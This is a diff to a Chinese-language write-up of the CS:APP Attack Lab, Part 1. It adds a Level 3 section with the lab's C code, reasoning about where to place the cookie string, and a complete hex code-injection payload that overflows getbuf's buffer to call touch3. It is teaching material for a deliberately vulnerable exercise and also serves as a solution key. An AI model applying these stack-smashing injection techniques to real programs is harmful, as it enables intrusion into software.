@@ -85,6 +85,8 @@ mov %rsp, %rdi
 
 此时画出栈的情况示意图:
 
+![l1-s](./pic/l1-s.png)
+
 
 从`<getbuf>`最后两行可以得知，当从`<getbuf>`返回退栈时，40字节的内容会被清空，并弹出栈顶数据到`%rip`寄存器中，此时程序转移控制流。
 
@@ -134,23 +136,20 @@ pop %rip
 ```
 即将栈顶数据弹栈到`%rip`寄存器中，同时栈顶指针上移(假设栈由高地址向低地址生长，低地址在底端)。
 
-画出栈的存储情况示意图：
 
 我们可以试想，同Level 1一样，在`<test>`的栈帧的返回地址处存放`<touch2>`的地址，从而在`<getbuf>`退栈时能调用`<touch2>`，但是有一个问题，我们需要预先传递我们的`cookie`参数到`%rdi`寄存器中，如果采用这种方式，参数就会无法传递。
 
 经过观察可以发现，`<getbuf>`函数开辟的40字节的栈帧，这部分空间在退栈时直接被清空，不会再进行使用，所以，我们可以考虑在这个部分放置我们的传递参数的代码，假设这部分标记为`<ta>`，那么我们可以进行如下考虑：
 
-首先`<getbuf>`退栈时转移控制流到`<ta>`部分，在此部分进行参数传递的工作，然后将`<touch2>`函数的入口地址压榨再弹栈(使用`ret`指令)，这样程序的控制流就正常转移到了`<touch2>`上并且也完成了参数传递。
+首先`<getbuf>`退栈时转移控制流到`<ta>`部分，在此部分进行参数传递的工作，然后将`<touch2>`函数的入口地址压栈再弹栈(使用`ret`指令)，这样程序的控制流就正常转移到了`<touch2>`上并且也完成了参数传递。
 
 ![l2-getbuf](./pic/al-l2-buf.png)
 
-此时查看栈顶指针`%rsp = 0x5561dc78`，所以栈帧情况如下图所示:
+此时查看栈顶指针`%rsp = 0x5561dc78`，画出栈的存储情况示意图：
 
+![l2-s](./pic/l2-s.png)
 
-
-
-
-所以，我们可以在蓝色括号所示的栈帧区域内填入我们的处理代码，在`<test>`返回地址处填入我们的处理代码的地址，处理代码如下所示:
+所以，我们可以在所示的栈帧区域内填入我们的处理代码，在`<test>`返回地址处填入我们的处理代码的地址，处理代码如下所示:
 
 ```x86asm
 # 传递cookie到rdi寄存器
@@ -187,9 +186,74 @@ ec 17 40 00 c3 00 00 00
 
 ![l2-pass](./pic/l2-pass.png)
 
+### Level 3
 
+Level 3中给出了两段C代码:
 
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval)
+{
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+```
 
+```c
+void touch3(char *sval)
+{
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+
+要求同Level 2大致相同，在返回`<test>`时，要求进入`<touch3>`，并将cookie作为参数传入。但是此处略有不同，仔细观察可知，`<touch2>`要求传入的参数是cookie的值，而此时`<touch3>`中的参数是一个`char`类型的指针。
+
+再细读一下`<hexmatch>`函数进一步验证了我们考虑：`sval`是一个`char`类型的指针，其中存储的是一个字符串的地址。所以，在这个函数中，我们实际要传入`%rdi`寄存器的是，我们准备存储的cookie的地址。
+
+这个时候问题产生了，我们要将cookie存储到何处？
+
+阅读`writeup`，里面有这样一段话:
+
+> When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful where you place the string representation of your cookie.
+
+所以我们大致可以知道，我们也许能够仔细地观察这几个函数的调用结构，将cookie存储到`getbuf`的栈帧上，只要保证`hexmatch`以及`strncmp`调用时不会影响到cookie即可。
+
+但是经过实验，将cookie放在计算后的`<getbuf>`栈帧中依然会报错:
+![l3-test](./pic/l3-test.png)
+
+可以看到虽然调用了`touch3`，但是cookie字符串并没有正确传入。
+
+所以最好的办法，还是将cookie放在`test`的栈帧里：
+
+![l3-s](./pic/l3-s.png)
+
+所以最终输入的答案为：
+
+```x86asm
+48 c7 c7 a8 dc 61 55 68 
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+输入测试:
+
+![l3-pass](./pic/l3-pass.png)
+
+Part 1到此结束。
 
 
 
